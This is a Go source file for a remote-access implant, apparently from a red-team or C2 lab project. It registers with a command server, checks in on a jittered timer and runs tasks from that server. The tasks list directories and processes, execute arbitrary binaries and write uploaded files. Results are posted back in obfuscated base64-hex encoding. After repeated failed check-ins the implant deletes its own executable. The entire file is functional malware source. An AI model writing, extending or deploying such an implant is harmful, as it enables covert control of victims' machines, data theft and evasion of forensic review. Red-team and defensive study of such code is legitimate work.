package main

import (
	"bytes"
	"encoding/hex"
	"encoding/json"
        "encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"time"
	"net"
	"strconv"
	"strings"
)


type ResultsCreate struct {
    TaskingID float64 `json:"tasking_id"`
    Session   string  `json:"session"`
    Task      string  `json:"task"`
    Args    string     `json:"args"`
    Results   string  `json:"results"`
}




func encodeToBaseHexString(input string) string {
        encodedBase64 := base64.StdEncoding.EncodeToString([]byte(input))
        encodedHex := hex.EncodeToString([]byte(encodedBase64))
        return encodedHex
}

func ParseTasks(serverUrl string, tasking string) (string, error) {
        
	var tasks []map[string]interface{}
	err := json.Unmarshal([]byte(tasking), &tasks)
	if err != nil {
		return "", err
	}
        fmt.Println(tasks)
        

	for _, taskData := range tasks {
                url := fmt.Sprintf("%s/results/%s", serverUrl, taskData["session"])
		fmt.Printf("Task ID: %v\n", taskData["id"])
		fmt.Printf("Task: %v\n", taskData["task"])
		fmt.Printf("Args: %v\n", taskData["args"])
                if taskData["task"] == "ls" {
                        dir, err := listDirectories(taskData["args"].(string))
                        if err != nil {
                                fmt.Println("Error listing directories:", err)
                                continue
                        }
                                                
                        encodedOutput := encodeToBaseHexString(dir)
                        encodedArgs := encodeToBaseHexString(taskData["args"].(string))
                        fmt.Println("Encoded args:", encodedArgs)
                        fmt.Println("Encoded output:", encodedOutput)
                        fmt.Println(taskData["id"].(float64))
                        result := ResultsCreate{
                                TaskingID: taskData["id"].(float64),
                                Session:   taskData["session"].(string),
                                Task:      taskData["task"].(string),
                                Args:      encodedArgs,
                                Results:   encodedOutput,
                        }
                        _, err = PostJson(url, result)
                        if err != nil {
                                fmt.Println("Error posting task result:", err)
                        }

                } else if taskData["task"] == "ps" {                
                        processList, err := get_ps()
                        if err != nil {
                                fmt.Println("Error getting process list:", err)
                                continue
                        }
                        encodedOutput := encodeToBaseHexString(processList)
                        result := ResultsCreate{
                                TaskingID: taskData["id"].(float64),
                                Session:   taskData["session"].(string),
                                Task:      taskData["task"].(string),
                                Args:      "",
                                Results:   encodedOutput,
                        }
                        _, err = PostJson(url, result)
                        if err != nil {
                                fmt.Println("Error posting task result:", err)
                        }
                        
                } else if taskData["task"] == "exec_bg" {
                        binary := strings.Split(taskData["args"].(string), " ")
                        output, err := execBinary(binary[0], binary[1:], true)
                        if err != nil {
                                fmt.Println("Error executing binary:", err)
                                encodedOutput := encodeToBaseHexString(err.Error())
                                encodedArgs := encodeToBaseHexString(taskData["args"].(string))
                                result := ResultsCreate{
                                        TaskingID: taskData["id"].(float64),
                                        Session:   taskData["session"].(string),
                                        Task:      taskData["task"].(string),
                                        Args:      encodedArgs,
                                        Results:   encodedOutput,
                                }
                                _, err = PostJson(url, result)
                                if err != nil {
                                        fmt.Println("Error posting task result:", err)
                                }
                                continue
                        }
                        encodedOutput := encodeToBaseHexString(output)
                        encodedArgs := encodeToBaseHexString(taskData["args"].(string))
                        result := ResultsCreate{
                                TaskingID: taskData["id"].(float64),
                                Session:   taskData["session"].(string),
                                Task:      taskData["task"].(string),
                                Args:      encodedArgs,
                                Results:   encodedOutput,
                        }
                        _, err = PostJson(url, result)
                        if err != nil {
                                fmt.Println("Error posting task result:", err)
                        }
                } else if taskData["task"] == "exec_fg" {
                        binary := strings.Split(taskData["args"].(string), " ")
                        output, err := execBinary(binary[0], binary[1:], false)
                        if err != nil {
                                fmt.Println("Error executing binary:", err)
                                encodedOutput := encodeToBaseHexString(err.Error())
                                encodedArgs := encodeToBaseHexString(taskData["args"].(string))
                                result := ResultsCreate{
                                        TaskingID: taskData["id"].(float64),
                                        Session:   taskData["session"].(string),
                                        Task:      taskData["task"].(string),
                                        Args:      encodedArgs,
                                        Results:   encodedOutput,
                                }
                                _, err = PostJson(url, result)
                                if err != nil {
                                        fmt.Println("Error posting task result:", err)
                                }
                                continue
                        }
                        encodedOutput := encodeToBaseHexString(output)
                        encodedArgs := encodeToBaseHexString(taskData["args"].(string))
                        result := ResultsCreate{
                                TaskingID: taskData["id"].(float64),
                                Session:   taskData["session"].(string),
                                Task:      taskData["task"].(string),
                                Args:      encodedArgs,
                                Results:   encodedOutput,
                        }
                        _, err = PostJson(url, result)
                        if err != nil {
                                fmt.Println("Error posting task result:", err)
                        }

                }

	}
	return "", nil
}


func TerminateImplant() {
	exePath, err := os.Executable()
	if err != nil {
		fmt.Printf("Failed to get executable path: %v\n", err)
		os.Exit(3)
	}

	if _, err := os.Stat(exePath); err == nil {
		err := os.Remove(exePath)
		if err != nil {
			fmt.Printf("Error removing implant file: %v\n", err)
			os.Exit(2)
		}
		fmt.Printf("Implant file %s removed successfully\n", exePath)
		os.Exit(1)
	}

	// Nothing on disk, just memory
	os.Exit(0)
}


func listDirectories(directory string) (string, error){
        fileList := ""
        dir, err := os.Open(directory)
        if err != nil {
                return "", err
        }
        defer dir.Close()

        files, err := dir.Readdir(-1)
        if err != nil {
                return "", err
        }
        for _, file := range files {
                line := fmt.Sprintf("%-15s %-22v %-10d %-20s\n", file.Mode(), file.ModTime().UTC().Format(time.RFC3339), file.Size(), file.Name())
                fileList += line
        }
        return fileList, nil
}

func uploadFile(conn net.Conn, remotePath string, fSize string) {
        fileSize, err := strconv.ParseInt(fSize, 10, 64)
        if err != nil {
                fmt.Fprintf(conn, "[!] Invalid file size\n__END__\n")
                return
        }

        file, err := os.OpenFile(remotePath, os.O_CREATE|os.O_WRONLY, 0777)
        if err != nil {
                fmt.Fprintf(conn, "[!] Error creating file at: %v\n__END__\n", err)
                return
        }
        defer file.Close()

        _, err = conn.Write([]byte{'1'})
        if err != nil {
                return
        }

        buffer := make([]byte, 4096)
        totalBytes := int64(0)

        for totalBytes < fileSize {
                n, err := conn.Read(buffer)
                if n > 0 {
                        _, write_err := file.Write(buffer[:n])
                        if write_err != nil {
                                fmt.Fprintf(conn, "[!] Error writing to file: %v\n__END__\n", write_err)
                                return
                        }
                        totalBytes += int64(n)
                }

                if err != nil {
                        fmt.Fprintf(conn, "[!] Error reading from connection: %v\n__END__\n", err)
                        return
                }
        }

        if totalBytes == fileSize {
                fmt.Fprintf(conn, "[+] Success writing data to: %v\n__END__\n", remotePath)

        } else {
                fmt.Fprintf(conn, "[!] File size mismatch: expected %d bytes, recieved %d bytes\n__END__\n", fileSize, totalBytes)
        }
}

func execBinary(binPath string, args []string, background bool) (string, error){
        binary := exec.Command(binPath, args...)

        var output bytes.Buffer

        if background {
                binary.Stdin = nil
                binary.Stdout, _ = os.Open(os.DevNull)
                binary.Stderr, _ = os.Open(os.DevNull)
        } else {
                binary.Stdin = nil
                binary.Stdout = &output
                binary.Stderr = &output
        }

        err := binary.Start()
        if err != nil {
                return "", err
        }

        if background {
                return "[+] Binary executed successfully in background", nil
        }

        err = binary.Wait()
        if err != nil {
                return "", err
        }

        return output.String(), nil

}


func main() {
	fmt.Println("Agent started")

	retryCounter := 0
	serverUrl := "http://127.0.0.1:8000"

	initialInfo := GatherInfo()

	callbackTimer := CallbackInfo{Callback_freq: 1, Jitter: 15, SelfTerminate: 20}

	// register with server 
	resp, err := PostJson(serverUrl+"/implants/", initialInfo)
	if err != nil {
		panic(err)
	}
	if resp != 200 {
		fmt.Printf("Response: %v\n", resp)
	}

        // listen for sigterm and sigint (testing only)
        sigHandler(serverUrl, initialInfo.Session)

	for {
		nextInterval := RandomJitter(callbackTimer.Callback_freq, callbackTimer.Jitter)
		timer := time.NewTimer(nextInterval)
		fmt.Printf("Next check-in in %s\n", nextInterval)

		<-timer.C
		resp, err := CheckIn(serverUrl, initialInfo.Session)
                if err != nil{
                        fmt.Printf("Error checking in: %v\n", err)
                        retryCounter += 1
                        if retryCounter >= callbackTimer.SelfTerminate {
                                TerminateImplant()
                        }
                        continue
                }
                if resp != 200 && resp != 301 {
                        fmt.Printf("Unexpected response: %v\n", resp)
                        retryCounter += 1
                        if retryCounter >= callbackTimer.SelfTerminate {
                                TerminateImplant()
                        }
                        continue
                }
                if resp == 301 {
                        // we have tasking
                        tasking, err := FetchTasking(serverUrl, initialInfo.Session)
                        if err != nil {
                                fmt.Printf("Error fetching tasking: %v\n", err)
                        } else {
                                ParseTasks(serverUrl, tasking)
                        }
                        continue
                }
		fmt.Println("Check-in fired")
                retryCounter = 0
		timer.Stop()
	}
}
